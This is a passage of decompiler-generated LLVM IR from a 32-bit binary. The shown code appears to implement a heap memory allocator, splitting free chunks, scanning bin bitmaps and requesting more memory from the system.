  %v3_8052650 = inttoptr i32 %v2_8052650 to i32*
  store i32 %v0_8052650, i32* %v3_8052650, align 4
  %v0_8052653 = load i32, i32* %esi.global-to-local, align 4
  %v0_8052656 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052656 = add i32 %v0_8052656, 8
  store i32 %v1_8052656, i32* %ecx.global-to-local, align 4
  %tmp126 = icmp ult i32 %v0_8052653, 16
  br i1 %tmp126, label %dec_label_pc_8052b57, label %dec_label_pc_805265f

dec_label_pc_805265f:                             ; preds = %dec_label_pc_8052647
  %v2_8052663 = add i32 %v0_8052656, %v1_8052808
  store i32 %v2_8052663, i32* @edx, align 4
  %v1_8052666 = or i32 %v1_8052808, 1
  store i32 %v1_8052666, i32* %ebx.global-to-local, align 4
  %v2_8052669 = add i32 %v0_8052656, 4
  %v3_8052669 = inttoptr i32 %v2_8052669 to i32*
  store i32 %v1_8052666, i32* %v3_8052669, align 4
  %v0_805266c = load i32, i32* %esi.global-to-local, align 4
  %v1_805266e = or i32 %v0_805266c, 1
  store i32 %v1_805266e, i32* %eax.global-to-local, align 4
  %v0_8052671 = load i32, i32* @edx, align 4
  %v1_8052671 = load i32, i32* @ebp, align 4
  %v2_8052671 = add i32 %v1_8052671, 8
  %v3_8052671 = inttoptr i32 %v2_8052671 to i32*
  store i32 %v0_8052671, i32* %v3_8052671, align 4
  %v0_8052674 = load i32, i32* @edx, align 4
  %v1_8052674 = load i32, i32* @ebp, align 4
  %v2_8052674 = add i32 %v1_8052674, 12
  %v3_8052674 = inttoptr i32 %v2_8052674 to i32*
  store i32 %v0_8052674, i32* %v3_8052674, align 4
  %v0_8052677 = load i32, i32* @edx, align 4
  %v1_8052677 = add i32 %v0_8052677, 8
  %v2_8052677 = inttoptr i32 %v1_8052677 to i32*
  store i32 ptrtoint (i32* @global_var_8056874.204 to i32), i32* %v2_8052677, align 4
  %v0_805267e = load i32, i32* @edx, align 4
  %v1_805267e = add i32 %v0_805267e, 12
  %v2_805267e = inttoptr i32 %v1_805267e to i32*
  store i32 ptrtoint (i32* @global_var_8056874.204 to i32), i32* %v2_805267e, align 4
  %v0_8052685 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052685 = load i32, i32* @edx, align 4
  %v2_8052685 = add i32 %v1_8052685, 4
  %v3_8052685 = inttoptr i32 %v2_8052685 to i32*
  store i32 %v0_8052685, i32* %v3_8052685, align 4
  %v0_8052688 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052688 = load i32, i32* @edx, align 4
  %v3_8052688 = add i32 %v1_8052688, %v0_8052688
  %v4_8052688 = inttoptr i32 %v3_8052688 to i32*
  store i32 %v0_8052688, i32* %v4_8052688, align 4
  br label %dec_label_pc_8052b5c

dec_label_pc_8052692:                             ; preds = %dec_label_pc_8052626, %dec_label_pc_8052616
  %v4_805263d = phi i32 [ %storemerge1.pre, %dec_label_pc_8052616 ], [ %v3_8052629, %dec_label_pc_8052626 ]
  store i32 %v4_805263d, i32* %eax.global-to-local, align 4
  %v12_8052692 = icmp eq i32 %v4_805263d, %v2_805261a
  %v1_8052694 = icmp eq i1 %v12_8052692, false
  br i1 %v1_8052694, label %dec_label_pc_8052626, label %dec_label_pc_8052696.loopexit

dec_label_pc_8052696.loopexit:                    ; preds = %dec_label_pc_8052692
  br label %dec_label_pc_8052696

dec_label_pc_8052696:                             ; preds = %dec_label_pc_8052696.loopexit, %dec_label_pc_8052608
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_805269f = add i32 %stack_var_-40.0.ph, 1
  %v2_80526a2 = udiv i32 %v1_805269f, 32
  store i32 %v2_80526a2, i32* @edi, align 4
  %v1_80526a5 = mul i32 %v1_805269f, 8
  %v2_80526a5 = add i32 %v1_80526a5, ptrtoint (i32* @global_var_805686c.202 to i32)
  store i32 %v2_80526a5, i32* %ebx.global-to-local, align 4
  %v1_80526ac = urem i32 %v1_805269f, 32
  %v2_80526ac = icmp eq i32 %v1_80526ac, 0
  store i32 %v1_80526ac, i32* %ecx.global-to-local, align 4
  %v1_80526af = mul nuw nsw i32 %v2_80526a2, 4
  %v2_80526af = add i32 %v1_80526af, ptrtoint (i32* @global_var_8056b74.206 to i32)
  %v3_80526af = inttoptr i32 %v2_80526af to i32*
  %v4_80526af = load i32, i32* %v3_80526af, align 4
  store i32 %v4_80526af, i32* %edx.global-to-local, align 4
  br i1 %v2_80526ac, label %.preheader, label %bb88

bb88:                                             ; preds = %dec_label_pc_8052696
  %v5_80526b6 = shl i32 1, %v1_80526ac
  store i32 %v5_80526b6, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_8052696, %bb88, %dec_label_pc_80526f7
  %v1_80526b8 = phi i32 [ %v1_80526b8.pre, %dec_label_pc_80526f7 ], [ %v4_80526af, %bb88 ], [ %v4_80526af, %dec_label_pc_8052696 ]
  %v0_80526bc = phi i32 [ %v0_80526b8.pre, %dec_label_pc_80526f7 ], [ %v5_80526b6, %bb88 ], [ 1, %dec_label_pc_8052696 ]
  %tmp89 = icmp ule i32 %v0_80526bc, %v1_80526b8
  %v1_80526bc = icmp eq i32 %v0_80526bc, 0
  %v1_80526be = icmp eq i1 %v1_80526bc, false
  %or.cond = and i1 %tmp89, %v1_80526be
  br i1 %or.cond, label %dec_label_pc_80526bc.dec_label_pc_80526ec.preheader_crit_edge, label %dec_label_pc_80526c0.preheader

dec_label_pc_80526bc.dec_label_pc_80526ec.preheader_crit_edge: ; preds = %.preheader
  %v0_80526e77.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80526ec.preheader

dec_label_pc_80526c0.preheader:                   ; preds = %.preheader
  %v0_80526c0.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80526c0

dec_label_pc_80526c0:                             ; preds = %dec_label_pc_80526c0.preheader, %dec_label_pc_80526ca
  %v0_80526c0 = phi i32 [ %v0_80526c0.pre, %dec_label_pc_80526c0.preheader ], [ %v1_80526c0, %dec_label_pc_80526ca ]
  %v1_80526c0 = add i32 %v0_80526c0, 1
  store i32 %v1_80526c0, i32* @edi, align 4
  %v6_80526c4 = icmp ugt i32 %v1_80526c0, 2
  br i1 %v6_80526c4, label %dec_label_pc_8052773.loopexit, label %dec_label_pc_80526ca

dec_label_pc_80526ca:                             ; preds = %dec_label_pc_80526c0
  %v1_80526ca = mul i32 %v1_80526c0, 4
  %v2_80526ca = add i32 %v1_80526ca, ptrtoint (i32* @global_var_8056b74.206 to i32)
  %v3_80526ca = inttoptr i32 %v2_80526ca to i32*
  %v4_80526ca = load i32, i32* %v3_80526ca, align 4
  store i32 %v4_80526ca, i32* %edx.global-to-local, align 4
  %v1_80526d1 = icmp eq i32 %v4_80526ca, 0
  br i1 %v1_80526d1, label %dec_label_pc_80526c0, label %dec_label_pc_80526d5

dec_label_pc_80526d5:                             ; preds = %dec_label_pc_80526ca
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_80526dc = mul i32 %v1_80526c0, 256
  store i32 %v2_80526dc, i32* %eax.global-to-local, align 4
  %v1_80526df = add i32 %v2_80526dc, ptrtoint (i32* @global_var_805686c.202 to i32)
  store i32 %v1_80526df, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80526ec.preheader

dec_label_pc_80526ec.preheader:                   ; preds = %dec_label_pc_80526bc.dec_label_pc_80526ec.preheader_crit_edge, %dec_label_pc_80526d5
  %v0_80526e77 = phi i32 [ %v1_80526df, %dec_label_pc_80526d5 ], [ %v0_80526e77.pre, %dec_label_pc_80526bc.dec_label_pc_80526ec.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_80526d5 ], [ %v0_80526bc, %dec_label_pc_80526bc.dec_label_pc_80526ec.preheader_crit_edge ]
  %v0_80526fe = phi i32 [ %v4_80526ca, %dec_label_pc_80526d5 ], [ %v1_80526b8, %dec_label_pc_80526bc.dec_label_pc_80526ec.preheader_crit_edge ]
  %v2_80526ec4 = and i32 %v0_80526fe, %esi.promoted
  %v3_80526ec5 = icmp eq i32 %v2_80526ec4, 0
  br i1 %v3_80526ec5, label %dec_label_pc_80526e7, label %dec_label_pc_80526f0

dec_label_pc_80526e7:                             ; preds = %dec_label_pc_80526ec.preheader, %dec_label_pc_80526e7
  %v2_80526ea18 = phi i32 [ %v2_80526ea, %dec_label_pc_80526e7 ], [ %esi.promoted, %dec_label_pc_80526ec.preheader ]
  %v0_80526e78 = phi i32 [ %v1_80526e7, %dec_label_pc_80526e7 ], [ %v0_80526e77, %dec_label_pc_80526ec.preheader ]
  %v1_80526e7 = add i32 %v0_80526e78, 8
  %v2_80526ea = mul i32 %v2_80526ea18, 2
  %v2_80526ec = and i32 %v2_80526ea, %v0_80526fe
  %v3_80526ec = icmp eq i32 %v2_80526ec, 0
  br i1 %v3_80526ec, label %dec_label_pc_80526e7, label %dec_label_pc_80526ec.dec_label_pc_80526f0_crit_edge

dec_label_pc_80526ec.dec_label_pc_80526f0_crit_edge: ; preds = %dec_label_pc_80526e7
  store i32 %v1_80526e7, i32* %ebx.global-to-local, align 4
  store i32 %v2_80526ea, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80526f0

dec_label_pc_80526f0:                             ; preds = %dec_label_pc_80526ec.dec_label_pc_80526f0_crit_edge, %dec_label_pc_80526ec.preheader
  %v0_8052700 = phi i32 [ %v2_80526ea, %dec_label_pc_80526ec.dec_label_pc_80526f0_crit_edge ], [ %esi.promoted, %dec_label_pc_80526ec.preheader ]
  %v1_805271a = phi i32 [ %v1_80526e7, %dec_label_pc_80526ec.dec_label_pc_80526f0_crit_edge ], [ %v0_80526e77, %dec_label_pc_80526ec.preheader ]
  %v1_80526f0 = add i32 %v1_805271a, 12
  %v2_80526f0 = inttoptr i32 %v1_80526f0 to i32*
  %v3_80526f0 = load i32, i32* %v2_80526f0, align 4
  store i32 %v3_80526f0, i32* %ecx.global-to-local, align 4
  %v12_80526f3 = icmp eq i32 %v3_80526f0, %v1_805271a
  %v1_80526f5 = icmp eq i1 %v12_80526f3, false
  br i1 %v1_80526f5, label %dec_label_pc_805270b, label %dec_label_pc_80526f7

dec_label_pc_80526f7:                             ; preds = %dec_label_pc_80526f0
  %v1_80526f9 = add i32 %v3_80526f0, 8
  store i32 %v1_80526f9, i32* %ebx.global-to-local, align 4
  %v1_80526fc = sub i32 -1, %v0_8052700
  store i32 %v1_80526fc, i32* %eax.global-to-local, align 4
  %v2_80526fe = and i32 %v0_80526fe, %v1_80526fc
  store i32 %v2_80526fe, i32* %edx.global-to-local, align 4
  %v2_8052700 = mul i32 %v0_8052700, 2
  store i32 %v2_8052700, i32* %esi.global-to-local, align 4
  %v1_8052702 = load i32, i32* @edi, align 4
  %v2_8052702 = mul i32 %v1_8052702, 4
  %v3_8052702 = add i32 %v2_8052702, ptrtoint (i32* @global_var_8056b74.206 to i32)
  %v4_8052702 = inttoptr i32 %v3_8052702 to i32*
  store i32 %v2_80526fe, i32* %v4_8052702, align 4
  %v0_80526b8.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_80526b8.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_805270b:                             ; preds = %dec_label_pc_80526f0
  %v1_805270b = add i32 %v3_80526f0, 4
  %v2_805270b = inttoptr i32 %v1_805270b to i32*
  %v3_805270b = load i32, i32* %v2_805270b, align 4
  store i32 %v3_805270b, i32* %edx.global-to-local, align 4
  %v1_805270e = add i32 %v3_80526f0, 12
  %v2_805270e = inttoptr i32 %v1_805270e to i32*
  %v3_805270e = load i32, i32* %v2_805270e, align 4
  store i32 %v3_805270e, i32* %eax.global-to-local, align 4
  %v1_8052711 = and i32 %v3_805270b, -4
  store i32 %v1_8052711, i32* @edx, align 4
  %v5_8052716 = sub i32 %v1_8052711, %v1_8052808
  store i32 %v5_8052716, i32* %esi.global-to-local, align 4
  store i32 %v3_805270e, i32* %v2_80526f0, align 4
  %v0_805271d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805271d = load i32, i32* %eax.global-to-local, align 4
  %v2_805271d = add i32 %v1_805271d, 8
  %v3_805271d = inttoptr i32 %v2_805271d to i32*
  store i32 %v0_805271d, i32* %v3_805271d, align 4
  %v0_8052720 = load i32, i32* %esi.global-to-local, align 4
  %tmp127 = icmp ult i32 %v0_8052720, 16
  br i1 %tmp127, label %dec_label_pc_8052725, label %dec_label_pc_805272c

dec_label_pc_8052725:                             ; preds = %dec_label_pc_805270b
  %v0_8052725 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8052725 = load i32, i32* @edx, align 4
  %v2_8052725 = add i32 %v0_8052725, 4
  %v3_8052725 = add i32 %v2_8052725, %v1_8052725
  %v4_8052725 = inttoptr i32 %v3_8052725 to i32*
  %v5_8052725 = load i32, i32* %v4_8052725, align 4
  %v6_8052725 = or i32 %v5_8052725, 1
  store i32 %v6_8052725, i32* %v4_8052725, align 4
  br label %dec_label_pc_805276b

dec_label_pc_805272c:                             ; preds = %dec_label_pc_805270b
  store i32 %v1_8052808, i32* %eax.global-to-local, align 4
  %v0_8052735 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052735 = add i32 %v0_8052735, %v1_8052808
  store i32 %v2_8052735, i32* @edx, align 4
  %v1_8052738 = load i32, i32* @ebp, align 4
  %v2_8052738 = add i32 %v1_8052738, 8
  %v3_8052738 = inttoptr i32 %v2_8052738 to i32*
  store i32 %v2_8052735, i32* %v3_8052738, align 4
  %v0_805273b = load i32, i32* @edx, align 4
  %v1_805273b = load i32, i32* @ebp, align 4
  %v2_805273b = add i32 %v1_805273b, 12
  %v3_805273b = inttoptr i32 %v2_805273b to i32*
  store i32 %v0_805273b, i32* %v3_805273b, align 4
  %v0_805273e = load i32, i32* @edx, align 4
  %v1_805273e = add i32 %v0_805273e, 8
  %v2_805273e = inttoptr i32 %v1_805273e to i32*
  store i32 ptrtoint (i32* @global_var_8056874.204 to i32), i32* %v2_805273e, align 4
  %v0_8052745 = load i32, i32* @edx, align 4
  %v1_8052745 = add i32 %v0_8052745, 12
  %v2_8052745 = inttoptr i32 %v1_8052745 to i32*
  store i32 ptrtoint (i32* @global_var_8056874.204 to i32), i32* %v2_8052745, align 4
  br i1 %v6_80524c1, label %dec_label_pc_8052754, label %dec_label_pc_805274e

dec_label_pc_805274e:                             ; preds = %dec_label_pc_805272c
  %v0_805274e = load i32, i32* @edx, align 4
  store i32 %v0_805274e, i32* @global_var_8056870.203, align 16
  br label %dec_label_pc_8052754

dec_label_pc_8052754:                             ; preds = %dec_label_pc_805272c, %dec_label_pc_805274e
  %v4_8052754 = or i32 %v1_8052808, 1
  %v0_8052759 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_8052754, i32* %ebx.global-to-local, align 4
  %v1_805275f = or i32 %v0_8052759, 1
  store i32 %v1_805275f, i32* %eax.global-to-local, align 4
  %v1_8052762 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8052762 = add i32 %v1_8052762, 4
  %v3_8052762 = inttoptr i32 %v2_8052762 to i32*
  store i32 %v4_8052754, i32* %v3_8052762, align 4
  %v0_8052765 = load i32, i32* %esi.global-to-local, align 4
  %v1_8052765 = load i32, i32* @edx, align 4
  %v3_8052765 = add i32 %v1_8052765, %v0_8052765
  %v4_8052765 = inttoptr i32 %v3_8052765 to i32*
  store i32 %v0_8052765, i32* %v4_8052765, align 4
  %v0_8052768 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052768 = load i32, i32* @edx, align 4
  %v2_8052768 = add i32 %v1_8052768, 4
  %v3_8052768 = inttoptr i32 %v2_8052768 to i32*
  store i32 %v0_8052768, i32* %v3_8052768, align 4
  br label %dec_label_pc_805276b

dec_label_pc_805276b:                             ; preds = %dec_label_pc_8052725, %dec_label_pc_8052754
  %v0_805276b = load i32, i32* %ecx.global-to-local, align 4
  %v1_805276b = add i32 %v0_805276b, 8
  store i32 %v1_805276b, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052b6d

dec_label_pc_8052773.loopexit:                    ; preds = %dec_label_pc_80526c0
  br label %dec_label_pc_8052773

dec_label_pc_8052773:                             ; preds = %dec_label_pc_8052773.loopexit, %dec_label_pc_805247b, %dec_label_pc_8052483
  %v0_8052773 = load i32, i32* @global_var_805686c.202, align 4
  store i32 %v0_8052773, i32* @ebx, align 4
  %v1_805277d = add i32 %v1_8052808, 16
  store i32 %v1_805277d, i32* @esi, align 4
  %v1_8052780 = add i32 %v0_8052773, 4
  %v2_8052780 = inttoptr i32 %v1_8052780 to i32*
  %v3_8052780 = load i32, i32* %v2_8052780, align 4
  %v1_8052787 = and i32 %v3_8052780, -4
  store i32 %v1_8052787, i32* %ecx.global-to-local, align 4
  %v7_805278a = icmp ult i32 %v1_8052787, %v1_805277d
  br i1 %v7_805278a, label %dec_label_pc_80527aa, label %dec_label_pc_805278e

dec_label_pc_805278e:                             ; preds = %dec_label_pc_8052773
  %v2_8052792 = add i32 %v0_8052773, %v1_8052808
  store i32 %v2_8052792, i32* @edx, align 4
  %v1_8052795 = or i32 %v1_8052808, 1
  store i32 %v1_8052795, i32* %eax.global-to-local, align 4
  store i32 %v2_8052792, i32* @global_var_805686c.202, align 4
  store i32 %v1_8052795, i32* %v2_8052780, align 4
  %v0_80527a1 = load i32, i32* %ecx.global-to-local, align 4
  %v5_80527a1 = sub i32 %v0_80527a1, %v1_8052808
  store i32 %v5_80527a1, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8052afd

dec_label_pc_80527aa:                             ; preds = %dec_label_pc_8052773
  %v0_80527aa = load i32, i32* @global_var_8056b9c.207, align 4
  store i32 %v0_80527aa, i32* %edx.global-to-local, align 4
  %v0_80527b0 = load i8, i8* @global_var_8056840.201, align 64
  %v1_80527b0 = and i8 %v0_80527b0, 2
  %v2_80527b0 = icmp eq i8 %v1_80527b0, 0
  br i1 %v2_80527b0, label %dec_label_pc_80527de, label %dec_label_pc_80527b9

dec_label_pc_80527b9:                             ; preds = %dec_label_pc_80527aa
  store i32 ptrtoint (i8* @global_var_8056840.201 to i32), i32* %stack_var_-92, align 4
  %v2_80527c1 = call i32 @function_8053031(i32* bitcast (i8* @global_var_8056840.201 to i32*))
  store i32 ptrtoint (i8* @global_var_8056840.201 to i32), i32* @ebx, align 4
  %v1_80527cb = add i32 %v1_8052808, -7
  store i32 %v1_80527cb, i32* %eax.global-to-local, align 4
  store i32 %v1_80527cb, i32* %stack_var_-92, align 4
  %v1_80527cf = call i32 @function_8052414(i32 %v1_80527cb)
  store i32 %v1_80527cf, i32* %eax.global-to-local, align 4
  store i32 %v1_80527cf, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052b6d

dec_label_pc_80527de:                             ; preds = %dec_label_pc_80527aa
  %v1_80527de = add i32 %v0_80527aa, -1
  store i32 %v1_80527de, i32* @ecx, align 4
  store i32 %v1_8052808, i32* @ebx, align 4
  %v1_80527e9 = load i32, i32* @global_var_8056b8c.208, align 4
  %v7_80527e9 = icmp ult i32 %v1_8052808, %v1_80527e9
  br i1 %v7_80527e9, label %dec_label_pc_80528ab, label %dec_label_pc_80527f5

dec_label_pc_80527f5:                             ; preds = %dec_label_pc_80527de
  %v0_80527f5 = load i32, i32* @global_var_8056b90.209, align 16
  store i32 %v0_80527f5, i32* %eax.global-to-local, align 4
  %v1_80527fa = load i32, i32* @global_var_8056b94.210, align 4
  %v5_8052800 = icmp slt i32 %v0_80527f5, %v1_80527fa
  br i1 %v5_8052800, label %dec_label_pc_8052806, label %dec_label_pc_80528ab

dec_label_pc_8052806:                             ; preds = %dec_label_pc_80527f5
  %v2_8052808 = add i32 %v1_8052808, 10
  %v3_8052808 = add i32 %v2_8052808, %v0_80527aa
  %v1_805280c = sub i32 0, %v0_80527aa
  store i32 %v1_805280c, i32* %eax.global-to-local, align 4
  %v2_805280e = and i32 %v3_8052808, %v1_805280c
  store i32 %v2_805280e, i32* @ebx, align 4
  %tmp128 = icmp ugt i32 %v2_805280e, %v1_8052808
  br i1 %tmp128, label %dec_label_pc_805281a, label %dec_label_pc_80528ab

dec_label_pc_805281a:                             ; preds = %dec_label_pc_8052806
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8052827 = call i32 @function_8053c58(i32 0, i32 %v2_805280e, i32 3, i32 34, i32 0, i32 0, i32 %v1_80527de, i32 %v1_80527de)
  store i32 %v8_8052827, i32* %eax.global-to-local, align 4
  store i32 %v8_8052827, i32* @edx, align 4
  %v10_8052831 = icmp eq i32 %v8_8052827, -1
  br i1 %v10_8052831, label %dec_label_pc_805281a.dec_label_pc_80528ab_crit_edge, label %dec_label_pc_8052836

dec_label_pc_805281a.dec_label_pc_80528ab_crit_edge: ; preds = %dec_label_pc_805281a
  %v0_80528ab.pre = load i32, i32* @global_var_805686c.202, align 4
  br label %dec_label_pc_80528ab

dec_label_pc_8052836:                             ; preds = %dec_label_pc_805281a
  %v1_8052838 = urem i32 %v8_8052827, 8
  %v2_8052838 = icmp eq i32 %v1_8052838, 0
  store i32 %v1_8052838, i32* %ecx.global-to-local, align 4
  br i1 %v2_8052838, label %dec_label_pc_8052850, label %dec_label_pc_805283d

dec_label_pc_805283d:                             ; preds = %dec_label_pc_8052836
  %v0_8052842 = load i32, i32* @ebx, align 4
  %v2_8052844 = sub nsw i32 8, %v1_8052838
  store i32 %v2_8052844, i32* %eax.global-to-local, align 4
  %v2_8052846 = add i32 %v2_8052844, %v8_8052827
  store i32 %v2_8052846, i32* @edx, align 4
  %v2_8052848 = sub i32 %v0_8052842, %v2_8052844
  store i32 %v2_8052848, i32* %esi.global-to-local, align 4
  %v2_805284a = inttoptr i32 %v2_8052846 to i32*
  store i32 %v2_8052844, i32* %v2_805284a, align 4
  br label %dec_label_pc_8052858

dec_label_pc_8052850:                             ; preds = %dec_label_pc_8052836
  %v1_8052850 = inttoptr i32 %v8_8052827 to i32*
  store i32 0, i32* %v1_8052850, align 4
  br label %dec_label_pc_8052858

dec_label_pc_8052858:                             ; preds = %dec_label_pc_805283d, %dec_label_pc_8052850
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_805283d ], [ @ebx, %dec_label_pc_8052850 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_8052858 = or i32 %storemerge, 2
  %v1_805285b = load i32, i32* @edx, align 4
  %v2_805285b = add i32 %v1_805285b, 4
  %v3_805285b = inttoptr i32 %v2_805285b to i32*
  store i32 %v1_8052858, i32* %v3_805285b, align 4
  %v0_805285e = load i32, i32* @global_var_8056b90.209, align 16
  %v1_8052863 = add i32 %v0_805285e, 1
  store i32 %v1_8052863, i32* %eax.global-to-local, align 4
  store i32 %v1_8052863, i32* @global_var_8056b90.209, align 16
  %v1_8052869 = load i32, i32* @global_var_8056b98.211, align 8
  %v7_805286f = icmp sgt i32 %v1_8052863, %v1_8052869
  br i1 %v7_805286f, label %dec_label_pc_8052871, label %dec_label_pc_8052876

dec_label_pc_8052871:                             ; preds = %dec_label_pc_8052858
  store i32 %v1_8052863, i32* @global_var_8056b98.211, align 8
  br label %dec_label_pc_8052876

dec_label_pc_8052876:                             ; preds = %dec_label_pc_8052858, %dec_label_pc_8052871
  %v0_8052876 = load i32, i32* @global_var_8056ba4.212, align 4
  %v1_805287b = load i32, i32* @ebx, align 4
  %v2_805287b = add i32 %v1_805287b, %v0_8052876
  store i32 %v2_805287b, i32* %eax.global-to-local, align 4
  store i32 %v2_805287b, i32* @global_var_8056ba4.212, align 4
  %v1_8052882 = load i32, i32* @global_var_8056bb0.213, align 16
  %tmp129 = icmp ugt i32 %v2_805287b, %v1_8052882
  br i1 %tmp129, label %dec_label_pc_805288a, label %dec_label_pc_805288f

dec_label_pc_805288a:                             ; preds = %dec_label_pc_8052876
  store i32 %v2_805287b, i32* @global_var_8056bb0.213, align 16
  br label %dec_label_pc_805288f

dec_label_pc_805288f:                             ; preds = %dec_label_pc_8052876, %dec_label_pc_805288a
  %v1_805288f = load i32, i32* @global_var_8056ba8.214, align 8
  %v2_805288f = add i32 %v1_805288f, %v2_805287b
  store i32 %v2_805288f, i32* %eax.global-to-local, align 4
  %v1_8052895 = load i32, i32* @global_var_8056bb4.215, align 4
  %tmp130 = icmp ugt i32 %v2_805288f, %v1_8052895
  br i1 %tmp130, label %dec_label_pc_80528a1, label %dec_label_pc_80524f2

dec_label_pc_80528a1:                             ; preds = %dec_label_pc_805288f
  store i32 %v2_805288f, i32* @global_var_8056bb4.215, align 4
  br label %dec_label_pc_80524f2

dec_label_pc_80528ab:                             ; preds = %dec_label_pc_8052806, %dec_label_pc_805281a.dec_label_pc_80528ab_crit_edge, %dec_label_pc_80527f5, %dec_label_pc_80527de
  %v0_80528ab = phi i32 [ %v0_80528ab.pre, %dec_label_pc_805281a.dec_label_pc_80528ab_crit_edge ], [ %v0_8052773, %dec_label_pc_80527f5 ], [ %v0_8052773, %dec_label_pc_8052806 ], [ %v0_8052773, %dec_label_pc_80527de ]
  store i32 %v0_80528ab, i32* %eax.global-to-local, align 4
  %v1_80528b4 = add i32 %v0_80528ab, 4
  %v2_80528b4 = inttoptr i32 %v1_80528b4 to i32*
  %v3_80528b4 = load i32, i32* %v2_80528b4, align 4
  %v1_80528be = and i32 %v3_80528b4, -4
  %v2_80528be = icmp eq i32 %v1_80528be, 0
  store i32 %v1_80528be, i32* @ebp, align 4
  %v1_80528c1 = load i32, i32* @global_var_8056b88.216, align 8
  %v2_80528c1 = add i32 %v1_80528c1, %v1_805277d
  store i32 %v2_80528c1, i32* %eax.global-to-local, align 4
  %v0_80528c7 = load i8, i8* @global_var_8056ba0.217, align 32
  %v1_80528c7 = urem i8 %v0_80528c7, 2
  %v2_80528c7 = icmp eq i8 %v1_80528c7, 0
  br i1 %v2_80528c7, label %dec_label_pc_80528d2, label %dec_label_pc_80528d0

dec_label_pc_80528d0:                             ; preds = %dec_label_pc_80528ab
  %v2_80528d0 = sub i32 %v2_80528c1, %v1_80528be
  store i32 %v2_80528d0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80528d2

dec_label_pc_80528d2:                             ; preds = %dec_label_pc_80528ab, %dec_label_pc_80528d0
  %v0_80528d6 = phi i32 [ %v2_80528c1, %dec_label_pc_80528ab ], [ %v2_80528d0, %dec_label_pc_80528d0 ]
  %v5_80528d6 = add i32 %v0_80528d6, %v1_80527de
  store i32 %v5_80528d6, i32* %eax.global-to-local, align 4
  %v1_80528da = sub i32 0, %v0_80527aa
  store i32 %v1_80528da, i32* @edx, align 4
  %v2_80528e2 = and i32 %v5_80528d6, %v1_80528da
  store i32 %v2_80528e2, i32* @esi, align 4
  %tmp91 = icmp slt i32 %v2_80528e2, 1
  br i1 %tmp91, label %dec_label_pc_80528fc, label %dec_label_pc_80528e6

dec_label_pc_80528e6:                             ; preds = %dec_label_pc_80528d2
  store i32 %v2_80528e2, i32* %stack_var_-92, align 4
  %v1_80528ea = call i32 @function_8054109(i32 %v2_80528e2)
  store i32 %v1_80528ea, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  store i32 %v1_80528ea, i32* @ebx, align 4
  %v10_80528f7 = icmp eq i32 %v1_80528ea, -1
  %v1_80528fa = icmp eq i1 %v10_80528f7, false
  br i1 %v1_80528fa, label %dec_label_pc_8052952.dec_label_pc_805295b_crit_edge, label %dec_label_pc_80528e6.dec_label_pc_80528fc_crit_edge

dec_label_pc_80528e6.dec_label_pc_80528fc_crit_edge: ; preds = %dec_label_pc_80528e6
  %v0_80528fc.pre = load i8, i8* @global_var_8056ba0.217, align 32
  br label %dec_label_pc_80528fc

dec_label_pc_80528fc:                             ; preds = %dec_label_pc_80528e6.dec_label_pc_80528fc_crit_edge, %dec_label_pc_80528d2
  %v0_8052928 = phi i32 [ -1, %dec_label_pc_80528e6.dec_label_pc_80528fc_crit_edge ], [ %v1_80528da, %dec_label_pc_80528d2 ]
  %v0_80528fc = phi i8 [ %v0_80528fc.pre, %dec_label_pc_80528e6.dec_label_pc_80528fc_crit_edge ], [ %v0_80528c7, %dec_label_pc_80528d2 ]
  %v1_80528fc = urem i8 %v0_80528fc, 2
  %v2_80528fc = icmp eq i8 %v1_80528fc, 0
  br i1 %v2_80528fc, label %dec_label_pc_80528fc.dec_label_pc_8052911_crit_edge, label %dec_label_pc_8052905

dec_label_pc_80528fc.dec_label_pc_8052911_crit_edge: ; preds = %dec_label_pc_80528fc
  %v0_8052911.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052911

dec_label_pc_8052905:                             ; preds = %dec_label_pc_80528fc
  %v2_8052909 = add i32 %v1_80528be, %v1_80527de
  store i32 %v2_8052909, i32* %eax.global-to-local, align 4
  %v0_805290b = load i32, i32* @esi, align 4
  %v2_805290b = add i32 %v0_805290b, %v2_8052909
  %v5_805290d = and i32 %v2_805290b, %v1_80528da
  store i32 %v5_805290d, i32* @esi, align 4
  br label %dec_label_pc_8052911

dec_label_pc_8052911:                             ; preds = %dec_label_pc_80528fc.dec_label_pc_8052911_crit_edge, %dec_label_pc_8052905
  %v0_8052911 = phi i32 [ %v0_8052911.pre, %dec_label_pc_80528fc.dec_label_pc_8052911_crit_edge ], [ %v5_805290d, %dec_label_pc_8052905 ]
  %tmp131 = icmp ult i32 %v0_8052911, 1048576
  br i1 %tmp131, label %dec_label_pc_8052919, label %dec_label_pc_805291e

dec_label_pc_8052919:                             ; preds = %dec_label_pc_8052911
  store i32 1048576, i32* @esi, align 4
  br label %dec_label_pc_805291e

dec_label_pc_805291e:                             ; preds = %dec_label_pc_8052911, %dec_label_pc_8052919
  %v0_8052932 = phi i32 [ %v0_8052911, %dec_label_pc_8052911 ], [ 1048576, %dec_label_pc_8052919 ]
  %tmp132 = icmp ugt i32 %v0_8052932, %v1_8052808
